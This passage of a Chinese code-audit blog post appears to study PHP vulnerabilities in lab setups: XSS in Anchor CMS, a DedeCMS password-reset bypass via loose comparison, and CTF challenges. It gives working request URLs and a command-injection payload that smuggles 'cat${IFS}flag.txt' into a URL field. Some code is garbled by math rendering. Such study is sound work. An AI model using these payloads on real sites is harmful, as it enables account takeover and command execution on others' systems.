style="zoom:80%;"><p>format方法如下，这里调用的几个方法，都没有进行xxs攻击的过滤</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image014.jpg" alt="img" style="zoom:80%;"><p>remove_relative_uri方法代码</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image016.jpg" alt="img" style="zoom: 80%;"><p>remove_script_name方法代码</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image018.jpg" alt="img" style="zoom:80%;"><h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用：</h3><p>所以我们只要输入一个xxs代码，就可以通过current_url()调用到网页中发起xss攻击</p><p>访问<a href="http://127.0.0.1/anchor-cms-0.9.2/index.php/alert('xssattack')">http://127.0.0.1/anchor-cms-0.9.2/index.php/%3Cscript%3Ealert('xssattack%27)%3C/script%3E</a>的结果如下</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image020.jpg" alt="img" style="zoom:80%;"><h3 id="ctf题目"><a class="markdownIt-Anchor" href="#ctf题目"></a> CTF题目</h3><p>源代码：</p><p>Index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$url</span>) &amp;&amp; filter_var(<span class="hljs-variable">$url</span>, FILTER_VALIDATE_URL))&#123;<br>  <span class="hljs-variable">$site_info</span> = parse_url(<span class="hljs-variable">$url</span>);<br>  <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/sec-redclub.com$/&#x27;</span>,<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>]))&#123;<br>    exec(<span class="hljs-string">&#x27;curl &quot;&#x27;</span>.<span class="hljs-variable">$site_info</span>[<span class="hljs-string">&#x27;host&#x27;</span>].<span class="hljs-string">&#x27;&quot;&#x27;</span>, <span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;You have curl <span class="hljs-subst">&#123;$site_info[&#x27;host&#x27;]&#125;</span> successfully!&lt;/h1&gt;&lt;/center&gt;</span><br><span class="hljs-string">       &lt;center&gt;&lt;textarea rows=&#x27;20&#x27; cols=&#x27;90&#x27;&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> implode(<span class="hljs-string">&#x27; &#x27;</span>, <span class="hljs-variable">$result</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Error: Host not allowed&lt;/h1&gt;&lt;/center&gt;&quot;</span>);<br>  &#125; <br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;center&gt;&lt;h1&gt;Just curl sec-redclub.com!&lt;/h1&gt;&lt;/center&gt;&lt;br&gt;</span><br><span class="hljs-string">     &lt;center&gt;&lt;h3&gt;For example:?url=http://sec-redclub.com&lt;/h3&gt;&lt;/center&gt;&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>f1agi3hEre.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;HRCTF&#123;f1lt3r_var_1s_s0_c00l&#125;&quot;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="filter_var函数"><a class="markdownIt-Anchor" href="#filter_var函数"></a> filter_var()函数</h4><p>filter_var() 函数通过指定的过滤器过滤一个变量。如果成功，则返回被过滤的数据。如果失败，则返回 FALSE。<br><code>用法：filter_var(variable, filter, options)</code></p><p><code>这里第二个参数是</code>FILTER_VALIDATE_URL过滤器，这个过滤器是用来过滤url的，但是这个过滤器会把伪协议当成url处理，例如JavaScript://这样的协议就会通过</p><p><code>然后</code>parse_url()这个函数是用来处理url的，解析 URL，返回其组成部分，</p><p>接下来用preg_match()函数匹配字符串’/sec-redclub.com<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msup><mi mathvariant="normal">/</mi><mo mathvariant="normal">′</mo></msup><mi mathvariant="normal">，</mi><mi mathvariant="normal">与</mi></mrow><annotation encoding="application/x-tex">/&#x27;，与</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.001892em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord">/</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">与</span></span></span></span>site_info[‘host’] 匹配，所以这个字符串只能在parse_url()解析的host的最后面</p><p>接下来就到了exec(‘curl &quot;’.$site_info[‘host’].’&quot;’, $result);</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel">curl可以把www.baidu.com;<span class="hljs-keyword">ls</span>;<span class="hljs-string">` sec-redclub.com这样的url解析成`</span>www.baidu.com，<span class="hljs-keyword">ls</span>，和sec-redclub.com<br></code></pre></td></tr></table></figure><p>所以我们构建的payload是http://192.168.44.3/red/?url=2333://”;cat${IFS}flag.txt;”<a href="http://sec-redclub.com">sec-redclub.com</a></p><p><code>双引号用来闭合前面的双引号，</code><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>I</mi><mi>F</mi><mi>S</mi><mi mathvariant="normal">在</mi><mi>l</mi><mi>i</mi><mi>n</mi><mi>u</mi><mi>x</mi><mi mathvariant="normal">下</mi><mi mathvariant="normal">表</mi><mi mathvariant="normal">示</mi><mi mathvariant="normal">分</mi><mi mathvariant="normal">隔</mi><mi mathvariant="normal">符</mi><mo separator="true">,</mo><mi mathvariant="normal">单</mi><mi mathvariant="normal">纯</mi><mi mathvariant="normal">的</mi><mi>c</mi><mi>a</mi><mi>t</mi></mrow><annotation encoding="application/x-tex">IFS在linux下表示分隔符, 单纯的cat</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.07847em;">I</span><span class="mord mathdefault" style="margin-right:0.13889em;">F</span><span class="mord mathdefault" style="margin-right:0.05764em;">S</span><span class="mord cjk_fallback">在</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mord mathdefault">i</span><span class="mord mathdefault">n</span><span class="mord mathdefault">u</span><span class="mord mathdefault">x</span><span class="mord cjk_fallback">下</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">示</span><span class="mord cjk_fallback">分</span><span class="mord cjk_fallback">隔</span><span class="mord cjk_fallback">符</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">单</span><span class="mord cjk_fallback">纯</span><span class="mord cjk_fallback">的</span><span class="mord mathdefault">c</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span></span></span></span>IFS2,bash解释器会把整个IFS2当做变量名，所以导致输不出来结果，然而如果加一个{}就固定了变量名，同理在后面加个$可以起到截断的作用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">效果如下<br></code></pre></td></tr></table></figure><p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image022.gif" alt="img" style="zoom:80%;">``</p><h2 id="红日安全代码审计-day-4-false-beard"><a class="markdownIt-Anchor" href="#红日安全代码审计-day-4-false-beard"></a> 红日安全[代码审计] Day 4 - False Beard</h2><h3 id="实例分析-2"><a class="markdownIt-Anchor" href="#实例分析-2"></a> 实例分析</h3><p>首先安装环境，织梦cms5.7版本</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image024.jpg" alt="img" style="zoom:80%;"><p>这个cms存在任意用户密码重置漏洞，触发点在\uploads\member\resetpassword.php</p><p>前面是判断当 $dopost 等于 safequestion 的时候，通过传入的 $mid 对应的 id 值来查询对应用户的安全问题、安全答案、用户id、电子邮件等信息。</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image026.jpg" alt="img" style="zoom:80%;"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;safequestion&#x27;</span>] == <span class="hljs-variable">$safequestion</span> &amp;&amp; <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;safeanswer&#x27;</span>] == <span class="hljs-variable">$safeanswer</span>)<br>  &#123;<br>    sn(<span class="hljs-variable">$mid</span>, <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;userid&#x27;</span>], <span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;email&#x27;</span>], <span class="hljs-string">&#x27;N&#x27;</span>);<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>前面判断了我们传入的值是否非空，这个判断语句是把数据库中的安全问题和安全答案与用户输入的进行对比，不过这里的判断条件是==，而不是===</p><p>PHP中这两个运算符的区别如下</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image028.jpg" alt="img" style="zoom:67%;"><p>所以假设用户没有设置安全问题和答案，那么默认情况下安全问题的值为 0 ，答案的值为 null （这里是数据库中的值，即 $row[‘safequestion’]=“0” 、 $row[‘safeanswer’]=null ）。当没有设置 safequestion 和 safeanswer 的值时，它们的值均为空字符串。第11行的if表达式也就变成了 if(‘0’ == ‘’ &amp;&amp; null == ‘’) ，即 if(false &amp;&amp; true) ，因为null其实就是空字符，所以我们只要让表达式 $row[‘safequestion’] == $safequestion 为 true 即可绕过。</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image030.jpg" alt="img" style="zoom: 80%;"><p>测试0.0，0e1，0.这3个都可以和0比较通过，利用这个可以绕过此判断，进入sn函数</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image032.jpg" alt="img" style="zoom:80%;"><p>在sn函数中if(!is_array(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>o</mi><mi>w</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">，</mi><mi mathvariant="normal">的</mi></mrow><annotation encoding="application/x-tex">row))，的</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">的</span></span></span></span>row会根据id到pwd_tmp表中判断是否存在对应的临时密码记录判断用户是否第一次进行忘记密码操作，如果是第一次，那if(!is_array(<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>r</mi><mi>o</mi><mi>w</mi><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mi mathvariant="normal">就</mi><mi mathvariant="normal">会</mi><mi mathvariant="normal">判</mi><mi mathvariant="normal">断</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi mathvariant="normal">，</mi><mi mathvariant="normal">进</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">到</mi><mi>n</mi><mi>e</mi><mi>w</mi><mi>m</mi><mi>a</mi><mi>i</mi><mi>l</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">row))就会判断通过，进入到 newmail(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mclose">)</span><span class="mclose">)</span><span class="mord cjk_fallback">就</span><span class="mord cjk_fallback">会</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">进</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">到</span><span class="mord mathdefault">n</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02691em;">w</span><span class="mord mathdefault">m</span><span class="mord mathdefault">a</span><span class="mord mathdefault">i</span><span class="mord mathdefault" style="margin-right:0.01968em;">l</span><span class="mopen">(</span></span></span></span>mid,<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>u</mi><mi>s</mi><mi>e</mi><mi>r</mi><mi>i</mi><mi>d</mi><mo separator="true">,</mo></mrow><annotation encoding="application/x-tex">userid,</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">u</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">i</span><span class="mord mathdefault">d</span><span class="mpunct">,</span></span></span></span>mailto,‘INSERT’,$send); 在 newmail 函数中执行 INSERT 操作</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image034.jpg" alt="img" style="zoom:80%;"><p>在INSERT 操作主要功能是发送修改密码的邮件到用户邮箱，然后插入一条记录在dede_pwd_tmp表中，我们可以看到$send == 'N’时，执行以下操作</p><p>return ShowMsg(‘稍后跳转到修改页’, <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>c</mi><mi>f</mi><msub><mi>g</mi><mi>b</mi></msub><mi>a</mi><mi>s</mi><mi>e</mi><mi>h</mi><mi>o</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">.</mi></mrow><annotation encoding="application/x-tex">cfg_basehost.</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">c</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">b</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">a</span><span class="mord mathdefault">s</span><span class="mord mathdefault">e</span><span class="mord mathdefault">h</span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord">.</span></span></span></span>cfg_memberurl.&quot;/resetpassword.php?dopost=getpasswd&amp;id=&quot;.mid."&amp;key=".randval);</p><p>用来打印修改密码的链接修改密码链接中的 $mid 参数对应的值是用户id，而 $randval 是在第一次 insert 操作的时候将其 md5 加密之后插入到 dede_pwd_tmp 表中</p><p>所以我们可以知道拼接的url是?dopost=getpasswd&amp;id=mid&key=randval</p><p>dopost=getpasswd 的操作在resetpassword.php中</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image036.jpg" alt="img" style="zoom:80%;"><p>在重置密码的时候判断输入的用户id是否执行过重置密码，如果id为空则退出；如果 $row 不为空，则会执行以下操作内容</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image038.jpg" alt="img" style="zoom:80%;"><p>这几行代码会判断修改密码是否超时，如果没有超时，就会进入密码修改页面，代码如下，会把$step赋值为2</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image040.jpg" alt="img" style="zoom:80%;"><p>然后现在的数据包中 $setp=2，然后又到了resetpassword.php 文件中。</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image042.jpg" alt="img" style="zoom:80%;"><p>if($row[‘pwd’] == <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>s</mi><mi>n</mi><mo stretchy="false">)</mo><mi mathvariant="normal">判</mi><mi mathvariant="normal">断</mi><mi mathvariant="normal">传</mi><mi mathvariant="normal">入</mi><mi mathvariant="normal">的</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">据</mi><mi mathvariant="normal">是</mi><mi mathvariant="normal">否</mi><mi mathvariant="normal">等</mi><mi mathvariant="normal">于</mi></mrow><annotation encoding="application/x-tex">sn)判断传入的数据是否等于</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mord cjk_fallback">判</span><span class="mord cjk_fallback">断</span><span class="mord cjk_fallback">传</span><span class="mord cjk_fallback">入</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">据</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">否</span><span class="mord cjk_fallback">等</span><span class="mord cjk_fallback">于</span></span></span></span>row[‘pwd’] 如果相等就完成重置密码操作</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image044.gif" alt="img" style="zoom:80%;"><h3 id="攻击过程"><a class="markdownIt-Anchor" href="#攻击过程"></a> 攻击过程</h3><p>首先注册2个用户</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image046.jpg" alt="img" style="zoom:80%;"><p>提交一个请求，这里232343用户的ID是3，所以提交</p><p><a href="http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=3">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=3</a></p><p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image048.gif" alt="img"></p><p>然后抓包发送得到key值</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image050.jpg" alt="img" style="zoom:80%;"><p>这里key=KEZatlFV，构建<a href="http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=3&amp;key=KEZatlFVrh">http://127.0.0.1/DedeCMS-V5.7-UTF8-SP2/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=3&amp;key=KEZatlFVrh</a></p><p>然后访问，把密码修改为123456</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image052.jpg" alt="img" style="zoom:80%;"><p>提示修改成功并且登录</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image054.jpg" alt="img" style="zoom:80%;"><p>数据库里的值也变成123456的md5值了</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image056.jpg" alt="img" style="zoom:80%;"><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image058.jpg" alt="img" style="zoom:80%;"><h3 id="ctf题目-2"><a class="markdownIt-Anchor" href="#ctf题目-2"></a> CTF题目</h3><p>首先题目是一个摇奖程序</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image060.gif" alt="img" style="zoom:80%;"><p>输入用户名就可以进行摇奖，但是金额只有20</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image062.gif" alt="img" style="zoom:80%;"><p>查看这个比较的代码(buy.php)里面有一段代码调用了buy.js</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image064.gif" alt="img" style="zoom:80%;"><p>在buy.js中程序将表单数据以json格式提交到api.php中</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image066.gif" alt="img" style="zoom:80%;"><p>而api.php中，把传入的数据用==进行比较，这涉及到PHP弱比较的问题</p><p>== 在进行比较的时候，会先将字符串类型转化成相同，再比较</p><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image068.gif" alt="img" style="zoom:80%;"><p>如果我们用true进行比较的话，就会把数字也转换成bool类型进行比较，就会比较通过了，而除了 0、false、null 以外均为 true，所以只要后台生成的数字没有0，就可以比较通过了。</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image070.gif" alt="img" style="zoom:80%;"><p>如图，显示比较成功了，金额增加了200000，多次发包，让自己的钱可以买flag就可以了</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image072.gif" alt="img" style="zoom:80%;"><h2 id="红日安全代码审计day-7-bell"><a class="markdownIt-Anchor" href="#红日安全代码审计day-7-bell"></a> 红日安全[代码审计]Day 7 – Bell</h2><p>首先安装带有漏洞的DedeCmsV5.6 版本</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image074.gif" alt="img" style="zoom:80%;"><p>根据官网发布的v5.7版本的补丁可以知道漏洞是由于 mchStrCode 这个编码方法造成的。</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image076.gif" alt="img" style="zoom:80%;"><p>我们先在文件夹里搜索mchStrCode发现有3处</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image078.gif" alt="img" style="zoom:80%;"><p>查看第一处的代码，如下图，这段代码是用parse_str 方法将mchStrCode函数解码后 $pd_encode 中的变量放到 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>m</mi><mi>c</mi><msub><mi>h</mi><mi>P</mi></msub><mi>o</mi><mi>s</mi><mi>t</mi><mi mathvariant="normal">数</mi><mi mathvariant="normal">组</mi><mi mathvariant="normal">中</mi><mi mathvariant="normal">然</mi><mi mathvariant="normal">后</mi><mi mathvariant="normal">通</mi><mi mathvariant="normal">过</mi><mi>f</mi><mi>o</mi><mi>r</mi><mi>e</mi><mi>a</mi><mi>c</mi><mi>h</mi><mo stretchy="false">(</mo></mrow><annotation encoding="application/x-tex">mch_Post 数组中然后通过foreach(</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">m</span><span class="mord mathdefault">c</span><span class="mord"><span class="mord mathdefault">h</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.32833099999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.13889em;">P</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord mathdefault">o</span><span class="mord mathdefault">s</span><span class="mord mathdefault">t</span><span class="mord cjk_fallback">数</span><span class="mord cjk_fallback">组</span><span class="mord cjk_fallback">中</span><span class="mord cjk_fallback">然</span><span class="mord cjk_fallback">后</span><span class="mord cjk_fallback">通</span><span class="mord cjk_fallback">过</span><span class="mord mathdefault" style="margin-right:0.10764em;">f</span><span class="mord mathdefault">o</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mord mathdefault">e</span><span class="mord mathdefault">a</span><span class="mord mathdefault">c</span><span class="mord mathdefault">h</span><span class="mopen">(</span></span></span></span>mch_Post as $k =&gt; $v) $$k = <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>v</mi><mo separator="true">;</mo><mi mathvariant="normal">，</mi><mi mathvariant="normal">把</mi></mrow><annotation encoding="application/x-tex">v;，把</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">v</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">把</span></span></span></span>mch_Post 中的键和值都赋给$k， $v</p><p>在这个过程没有对定义的键值进行检查，如果攻击者通过mschstrcode进行编码，绕过一些过滤方式，就可以使代码直达目标</p><img src="/2021/05/17/%E7%BA%A2%E6%97%A5%E5%AE%89%E5%85%A8-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-3%E5%88%99/clip_image080.jpg" alt="img" style="zoom:80%;"><p>查看mchStrcode的代码，如下图</p><img 